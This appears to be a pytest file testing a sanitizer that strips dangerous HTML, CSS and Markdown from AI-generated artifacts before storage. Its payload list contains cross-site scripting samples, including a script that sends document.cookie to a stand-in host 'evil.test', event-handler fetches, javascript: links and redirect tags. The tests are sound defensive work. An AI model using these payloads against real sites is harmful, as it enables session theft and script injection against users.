"""Artifact security tests.

These are the tests that matter most for the "treat generated HTML as
untrusted" requirement: every one of them is a payload a model could plausibly
emit, and the assertion is that it does not survive into stored content.
"""

from __future__ import annotations

import pytest
from httpx import AsyncClient

from app.errors import SanitizationError
from app.security.sanitizer import (
    CSP,
    sanitize_html,
    sanitize_markdown,
    wrap_document,
)


@pytest.mark.parametrize(
    "payload",
    [
        "<p>hi</p><script>fetch('https://evil.test?c='+document.cookie)</script>",
        "<img src=x onerror=\"fetch('https://evil.test')\">",
        "<a href=\"javascript:alert(1)\">click</a>",
        "<iframe src=\"https://evil.test\"></iframe>",
        "<form action=\"https://evil.test\"><input name=pw type=password></form>",
        "<object data=\"https://evil.test/x.swf\"></object>",
        "<svg><script>alert(1)</script></svg>",
        "<base href=\"https://evil.test/\">",
        "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.test\">",
        "<link rel=stylesheet href=\"https://evil.test/x.css\">",
        "<div onclick=\"alert(1)\">text</div>",
        "<body onload=alert(1)>text</body>",
    ],
)
def test_dangerous_html_is_removed(payload: str) -> None:
    cleaned, _ = sanitize_html(payload)
    lowered = cleaned.lower()
    for token in ("<script", "<iframe", "<object", "<form", "<input", "<base", "<link", "<meta"):
        assert token not in lowered
    assert "onerror" not in lowered
    assert "onclick" not in lowered
    assert "onload" not in lowered
    assert "javascript:" not in lowered
    assert "evil.test" not in lowered or "<a" not in lowered


def test_safe_structural_html_survives() -> None:
    payload = (
        "<section><h1>Retention playbook</h1>"
        '<p class="lead">Cohorts beat aggregates.</p>'
        "<ul><li>Step one</li><li>Step two</li></ul>"
        "<table><tr><th>Metric</th><td>D30</td></tr></table></section>"
    )
    cleaned, report = sanitize_html(payload)
    assert "<h1>" in cleaned
    assert "<ul>" in cleaned and "<li>" in cleaned
    assert "<table>" in cleaned and "<th>" in cleaned
    assert 'class="lead"' in cleaned
    assert report.had_script is False


def test_style_blocks_are_kept_but_css_is_filtered() -> None:
    payload = (
        "<style>@import url('https://evil.test/x.css');"
        "body{background:url('https://evil.test/pixel.png');color:#111}"
        ".card{border:1px solid #eee;padding:16px}</style>"
        "<div class='card'>content</div>"
    )
    cleaned, report = sanitize_html(payload)
    assert "<style>" in cleaned
    assert ".card{border:1px solid #eee" in cleaned.replace("\n", "")
    assert "@import" not in cleaned
    assert "evil.test" not in cleaned
    assert report.removed_style_declarations >= 1
    assert report.removed_urls


def test_data_uri_images_are_allowed_remote_images_are_not() -> None:
    ok, _ = sanitize_html('<img src="data:image/png;base64,iVBORw0KGgo=" alt="x">')
    assert "data:image/png" in ok

    blocked, _ = sanitize_html('<img src="https://tracker.test/pixel.gif" alt="x">')
    assert "tracker.test" not in blocked


def test_inline_style_attribute_survives_but_expressions_do_not() -> None:
    cleaned, _ = sanitize_html(
        '<p style="color:#333;font-size:18px">a</p>'
        '<p style="width:expression(alert(1))">b</p>'
    )
    assert "color:#333" in cleaned
    assert "expression(" not in cleaned


def test_oversized_artifact_is_rejected() -> None:
    with pytest.raises(SanitizationError):
        sanitize_html("<p>x</p>" * 200_000)


def test_wrap_document_adds_csp_and_title() -> None:
    document = wrap_document("<h1>Title</h1>", title="My <b>artifact</b>")
    assert CSP in document
    assert "script-src 'none'" in document
    assert "<!doctype html>" in document
    assert "My artifact" in document  # title is escaped/stripped, not rendered


def test_markdown_sanitization_keeps_prose_but_drops_scripts() -> None:
    source = (
        "# Playbook\n\n"
        "Use `a < b` comparisons and | tables |.\n\n"
        "<script>alert(1)</script>\n"
        "[click](javascript:alert(1))\n"
    )
    cleaned = sanitize_markdown(source)
    assert "a < b" in cleaned
    assert "| tables |" in cleaned
    assert "<script>" not in cleaned
    assert "javascript:alert" not in cleaned


async def test_artifact_api_sanitizes_before_persisting(client: AsyncClient) -> None:
    session_id = (
        await client.post("/api/sessions", json={"external_user_id": "artifacts"})
    ).json()["id"]

    response = await client.post(
        "/api/artifacts",
        json={
            "session_id": session_id,
            "type": "html",
            "title": "Injected",
            "content": "<h1>ok</h1><script>alert(1)</script>",
        },
    )
    assert response.status_code == 201
    body = response.json()
    assert "<script>" not in body["content"]
    assert "<h1>ok</h1>" in body["content"]
    assert body["metadata"]["sanitization"]["had_script"] is True

    fetched = (await client.get(f"/api/artifacts/{body['id']}")).json()
    assert "<script>" not in fetched["content"]
